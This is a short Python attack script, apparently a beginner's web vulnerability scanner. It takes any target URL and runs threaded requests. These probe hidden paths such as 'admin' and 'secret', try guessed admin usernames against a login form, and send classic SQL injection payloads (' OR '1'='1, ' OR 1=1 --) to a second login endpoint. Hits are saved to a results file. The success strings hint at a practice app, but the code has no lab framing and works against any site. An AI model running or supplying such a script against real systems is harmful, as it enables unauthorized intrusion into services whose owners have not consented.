import requests
import threading

base_url = input("Enter target URL: ")

print("\n[INFO] Starting scan...\n")

results = []
lock = threading.Lock()

# 🔍 Directory scanning
paths = ["admin", "login", "dashboard", "secret"]

def scan_directory(path):
    url = f"{base_url}/{path}"

    try:
        response = requests.get(url)

        if response.status_code == 200:
            result = f"[FOUND] {url}"
            print(result)

            with lock:
                results.append(result)

    except:
        pass


# 🔐 Auth bypass test
def test_auth(payload):
    url = f"{base_url}/login"

    try:
        data = {"username": payload, "password": "test"}
        response = requests.post(url, data=data)

        if "Welcome admin" in response.text:
            result = f"[VULNERABLE] Auth bypass → {payload}"
            print(result)

            with lock:
                results.append(result)

    except:
        pass


# 💉 SQL Injection test
def test_sql(payload):
    url = f"{base_url}/login2"

    try:
        data = {"username": payload, "password": "test"}
        response = requests.post(url, data=data)

        if "Logged in" in response.text:
            result = f"[SQL VULNERABLE] → {payload}"
            print(result)

            with lock:
                results.append(result)

    except:
        pass


threads = []

# Run directory scan
for path in paths:
    t = threading.Thread(target=scan_directory, args=(path,))
    threads.append(t)
    t.start()

# Run auth tests
auth_payloads = ["admin", "admin123", "testadmin"]

for payload in auth_payloads:
    t = threading.Thread(target=test_auth, args=(payload,))
    threads.append(t)
    t.start()

# Run SQL tests
sql_payloads = ["' OR '1'='1", "' OR 1=1 --"]

for payload in sql_payloads:
    t = threading.Thread(target=test_sql, args=(payload,))
    threads.append(t)
    t.start()

# Wait for all threads
for t in threads:
    t.join()

# Save results
with open("vuln_results.txt", "w", encoding="utf-8") as f:
    for r in results:
        f.write(r + "\n")

print("\n[INFO] Scan completed. Results saved.")